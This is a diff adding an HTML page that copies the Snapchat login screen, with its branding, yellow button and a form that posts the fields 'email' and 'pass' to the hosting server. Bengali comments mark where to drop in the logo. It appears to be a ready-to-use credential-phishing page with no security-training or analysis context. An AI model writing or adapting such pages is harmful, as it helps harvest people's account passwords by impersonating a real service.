@@ -1,0 +1,169 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Log in to Snapchat</title>
+    <style>
+        /* Basic Styles */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+        
+        body {
+            background-color: #f7f7f7;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            color: #000;
+        }
+        
+        /* Login Container */
+        .login-container {
+            background-color: #fff;
+            padding: 40px 30px;
+            border-radius: 20px;
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 380px;
+            text-align: center;
+        }
+        
+        /* Snapchat Ghost Logo */
+        .snapchat-logo {
+            width: 70px; /* লোগোর সাইজ পরিবর্তন করতে পারেন */
+            height: auto;
+            margin-bottom: 25px;
+        }
+        
+        /* Title */
+        h1 {
+            font-size: 28px;
+            font-weight: 800;
+            margin-bottom: 25px;
+            color: #000;
+        }
+        
+        /* Form and Input Styles */
+        .input-group {
+            margin-bottom: 18px;
+            text-align: left;
+        }
+        
+        label {
+            display: block;
+            margin-bottom: 8px;
+            font-size: 14px;
+            font-weight: 600;
+            color: #8e8e8e;
+            text-transform: uppercase;
+        }
+        
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            height: 50px;
+            border: 1px solid #e2e2e2;
+            border-radius: 8px;
+            padding: 0 15px;
+            font-size: 16px;
+            background-color: #f7f7f7;
+            transition: all 0.3s;
+        }
+        
+        input[type="text"]:focus,
+        input[type="password"]:focus {
+            outline: none;
+            border-color: #b2b2b2;
+            background-color: #fff;
+            box-shadow: 0 0 0 3px rgba(255, 252, 0, 0.5);
+        }
+        
+        ::placeholder {
+            color: #b2b2b2;
+        }
+        
+        /* Login Button */
+        .login-button {
+            background-color: #fffc00; /* Snapchat's iconic yellow */
+            color: #000;
+            border: none;
+            border-radius: 25px; /* Rounded pill shape */
+            padding: 15px 0;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            width: 100%;
+            margin-top: 10px;
+            margin-bottom: 20px;
+            transition: all 0.2s ease-in-out;
+            text-transform: uppercase;
+        }
+        
+        .login-button:hover {
+            background-color: #e6e300;
+            transform: translateY(-2px);
+        }
+        
+        /* Forgot Password Link */
+        .forgot-password {
+            color: #00aaff;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 600;
+            display: block;
+        }
+        
+        .forgot-password:hover {
+            text-decoration: underline;
+        }
+        
+        /* Responsive Design */
+        @media (max-width: 480px) {
+            body {
+                background-color: #fff;
+                align-items: flex-start;
+                padding-top: 40px;
+            }
+            
+            .login-container {
+                box-shadow: none;
+                padding: 20px 15px;
+                border-radius: 0;
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="login-container">
+        
+        <!-- Snapchat Ghost Logo Image -->
+        <!-- <<<<< এইখানে আপনার লোগো ফাইলের নাম দিন >>>>> -->
+        <img src="png-data/snapchat-logo.png" alt="Snapchat Logo" class="snapchat-logo">
+        
+        <h1>Welcome Back!</h1>
+        
+        <form method="POST" action="/">
+            <div class="input-group">
+                <label for="username">Username or Email</label>
+                <input type="text" name="email" id="username" required>
+            </div>
+            
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" name="pass" id="password" required>
+            </div>
+            
+            <button type="submit" class="login-button">Log In</button>
+            
+            <a href="#" class="forgot-password">Forgot your password?</a>
+        </form>
+    </div>
+
+</body>
+</html>
